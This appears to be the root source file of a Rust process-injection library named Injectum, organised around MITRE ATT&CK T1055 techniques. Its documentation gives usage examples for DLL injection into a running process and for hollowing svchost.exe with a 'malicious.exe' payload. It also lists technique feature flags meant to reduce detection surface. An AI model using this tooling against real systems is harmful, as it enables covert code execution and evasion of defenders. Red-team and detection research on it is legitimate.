//! # Injectum
//!
//! **Injectum** is a modular, type-safe library for process injection in Rust. It provides a
//! structured interface for executing various injection strategies (mapped to MITRE ATT&CK T1055
//! techniques) while abstracting platform-specific implementations and memory management.
//!
//! ## Core Architecture
//!
//! The library is built around a unidirectional data flow:
//! **Builder** -> **Configuration** -> **Factory** -> **Execution**.
//!
//! Users can choose between two primary interfaces:
//! 1. **[`InjectorBuilder`]:** A fluent interface for constructing and validating injection requests. (Recommended)
//! 2. **[`Injector`]:** The stateless driver for running a fully constructed configuration directly.
//!
//! ## Usage Examples
//!
//! ### 1. Classic DLL Injection (Remote Process)
//!
//! This example demonstrates targeting an existing process ID (PID) to load a DLL from disk.
//!
//! ```rust,no_run
//! use injectum::{
//!     InjectorBuilder, Error, Payload, PayloadMetadata, Result, Target, Technique,
//!     method::DynamicLinkLibrary
//! };
//! use std::path::PathBuf;
//!
//! fn main() -> injectum::Result<()> {
//!     // 1. Define the payload
//!     // For Classic Injection, the 'file_path' is mandatory.
//!     let payload = Payload::DllFile {
//!         file_path: Some(PathBuf::from("C:\\temp\\payload.dll")),
//!         image_bytes: None,
//!         metadata: PayloadMetadata::default(),
//!     };
//!
//!     // 2. Configure the technique (T1055.001 -> Classic)
//!     let technique = Technique::T1055_001(DynamicLinkLibrary::Classic);
//!
//!     // 3. Build and Execute targeting a PID
//!     InjectorBuilder::new()
//!         .target(Target::Pid(1024))
//!         .technique(technique)
//!         .payload(payload)
//!         .execute()?;
//!
//!     Ok(())
//! }
//! ```
//!
//! ### 2. Process Hollowing (Spawned Process)
//!
//! This example shows how to spawn a suspended process and "hollow" it out with a new PE payload.
//! Note the use of [`Payload::from_file`] for automatic type detection.
//!
//! ```rust,no_run
//! use injectum::{
//!     InjectorBuilder, Payload, PayloadMetadata, Target, Technique,
//!     method::ProcessHollowing
//! };
//! use std::path::PathBuf;
//!
//! fn main() -> injectum::Result<()> {
//!     // 1. Load payload from disk (Automatically detects EXE vs DLL)
//!     let payload = Payload::from_file(
//!         "C:\\temp\\malicious.exe",
//!         PayloadMetadata::default()
//!     )?;
//!
//!     // 2. Configure the technique (T1055.012 -> Process Hollowing)
//!     let technique = Technique::T1055_012(ProcessHollowing::Standard);
//!
//!     // 3. Build and Execute targeting a new process
//!     InjectorBuilder::new()
//!         .target(Target::Spawn(PathBuf::from("C:\\Windows\\System32\\svchost.exe")))
//!         .technique(technique)
//!         .payload(payload)
//!         .execute()?;
//!
//!     Ok(())
//! }
//! ```
//!
//! ## Feature Flags
//!
//! To minimize binary size and detection surface, specific techniques are gated behind Cargo features.
//! You must enable the features corresponding to the strategies you intend to use.
//!
//! ```toml
//! [features]
//! default   = []
//! tracing   = [] # Enable structured logging via the `tracing` crate
//! full      = [] # Activates all techniques at once
//!
//! # MITRE ATT&CK Techniques
//! T1055_001 = [] # Dynamic-link Library Injection (Windows)
//! T1055_002 = [] # Portable Executable Injection (Windows)
//! T1055_003 = [] # Thread Execution Hijacking (Windows)
//! T1055_004 = [] # Asynchronous Procedure Call (Windows)
//! T1055_005 = [] # Thread Local Storage (Windows)
//! T1055_008 = [] # Ptrace System Calls (Linux)
//! T1055_009 = [] # Proc Memory (Windows)
//! T1055_011 = [] # Extra Window Memory Injection (Windows)
//! T1055_012 = [] # Process Hollowing (Windows)
//! T1055_013 = [] # Process Doppelgänging (Windows)
//! T1055_014 = [] # VDSO Hijacking (Linux)
//! T1055_015 = [] # ListPlanting (Windows)
//! ```

pub mod builder;
pub mod error;
pub(crate) mod factory;
pub mod injector;
pub mod payload;
pub mod strategy;
pub mod target;

// Core API (Root Namespace)
pub use builder::InjectorBuilder;
pub use error::{Error, Result};
pub use injector::Injector;
pub use payload::{Payload, PayloadMetadata};
pub use strategy::Technique;
pub use target::Target;

// Configuration API (Grouped Namespace)
// Helper module to access specific technique configurations.
pub mod method {
    #[cfg(all(feature = "T1055_001", target_os = "windows"))]
    pub use crate::strategy::DynamicLinkLibrary;

    #[cfg(all(feature = "T1055_002", target_os = "windows"))]
    pub use crate::strategy::PortableExecutable;

    #[cfg(all(feature = "T1055_004", target_os = "windows"))]
    pub use crate::strategy::AsynchronousProcedureCall;

    #[cfg(all(feature = "T1055_012", target_os = "windows"))]
    pub use crate::strategy::ProcessHollowing;
}

#[cfg(feature = "tracing")]
#[allow(unused_imports)]
pub(crate) use tracing::{debug, error, info, warn};

// Stub macros to allow compiling without the 'tracing' feature
#[cfg(not(feature = "tracing"))]
mod stealth {
    #[macro_export]
    macro_rules! debug {
        ($($arg:tt)*) => {};
    }
    #[macro_export]
    macro_rules! error {
        ($($arg:tt)*) => {};
    }
    #[macro_export]
    macro_rules! info {
        ($($arg:tt)*) => {};
    }
    #[macro_export]
    macro_rules! trace {
        ($($arg:tt)*) => {};
    }
    #[macro_export]
    macro_rules! warn {
        ($($arg:tt)*) => {};
    }
}
